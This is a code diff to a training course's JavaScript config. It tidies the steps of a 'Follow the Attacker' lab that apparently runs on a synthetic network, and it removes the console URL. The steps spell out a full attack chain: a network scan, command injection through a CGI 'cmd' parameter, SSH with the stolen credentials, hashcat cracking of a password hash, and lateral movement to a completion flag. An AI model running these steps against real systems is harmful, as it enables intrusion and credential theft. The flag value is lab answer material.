@@ -381,17 +381,17 @@ var ATTESTATION = [
    --------------------------------------------------------------------- */
 var LAB = {
   title: "Hands-on: Follow the Attacker",
-  consoleUrl: "http://192.168.5.69:8090/guacamole/",
+  consoleUrl: "",
   flag: "FLAG-LAB-COMPLETE-7CPYG6K",
   intro: "The modules covered how attackers think. Now do it yourself, against a safe, self-contained practice environment built for this course. Nothing here is a real system - every account, password and \"vulnerability\" is synthetic and exists only inside this lab.",
   steps: [
     ["1. Access the lab", "Open the console link above and sign in with the login your trainer gave you. You'll land directly in a terminal on the attacker machine - no setup required."],
     ["2. Find the web server", "Scan the lab network to find the exposed service:<pre>nmap -sV 10.50.10.0/24</pre>Look for the host with TCP port 8080 open - this is web01 (10.50.10.25 in the default lab instance; your trainer will confirm the address if yours differs)."],
-    ["3. Inspect the application", "<pre>curl http://10.50.10.25:8080/ </pre>" "<pre> curl http://10.50.10.25:8080/cgi-bin/diagnostic?cmd=help </pre>"],
-    ["4. Exploit the guided flaw", "Run a harmless identity command, then read the staged support note:<pre>curl \"http://10.50.10.25:8080/cgi-bin/diagnostic?cmd=whoami\"\ncurl \"http://10.50.10.25:8080/cgi-bin/diagnostic?cmd=read-support-note\"</pre>Record the returned <code>websupport</code> password."],
-    ["5. Use the recovered credentials", "<pre>ssh websupport@10.50.10.25\ncat README.txt</pre>Accept the host key and enter the recovered password. README.txt gives the APP01 username and a password hash - it needs cracking before you can use it."],
-    ["6. Crack the recovered hash", "Copy the hash into a file on the attacker host and run a dictionary attack against it:<pre>echo '&lt;paste the hash here&gt;' &gt; hash.txt\nhashcat -m 0 -a 0 hash.txt /usr/share/wordlists/common.txt</pre>This recovers the plain-text APP01 password in seconds."],
-    ["7. Move to the internal server", "From your web01 session:<pre>ssh authority_sync@app01\ncat FINAL.txt</pre>FINAL.txt contains the completion flag - enter it below."]
+    ["3. Inspect the application", "<pre>curl http://10.50.10.25:8080/</pre><pre>curl \"http://10.50.10.25:8080/cgi-bin/diagnostic?cmd=help\"</pre>"],
+    ["4. Exploit the guided flaw", "Run a harmless identity command, then read the staged support note:<pre>curl \"http://10.50.10.25:8080/cgi-bin/diagnostic?cmd=whoami\"</pre><pre>curl \"http://10.50.10.25:8080/cgi-bin/diagnostic?cmd=read-support-note\"</pre>Record the returned <code>websupport</code> password."],
+    ["5. Use the recovered credentials", "<pre>ssh websupport@10.50.10.25</pre><pre>cat README.txt</pre>Accept the host key and enter the recovered password. README.txt gives the APP01 username and a password hash - it needs cracking before you can use it."],
+    ["6. Crack the recovered hash", "Copy the hash into a file on the attacker host and run a dictionary attack against it:<pre>echo '&lt;paste the hash here&gt;' &gt; hash.txt</pre><pre>hashcat -m 0 -a 0 hash.txt /usr/share/wordlists/common.txt</pre>This recovers the plain-text APP01 password in seconds."],
+    ["7. Move to the internal server", "From your web01 session:<pre>ssh authority_sync@app01</pre><pre>cat FINAL.txt</pre>FINAL.txt contains the completion flag - enter it below."]
   ],
   takeaways: [
     "Discover an exposed service.",
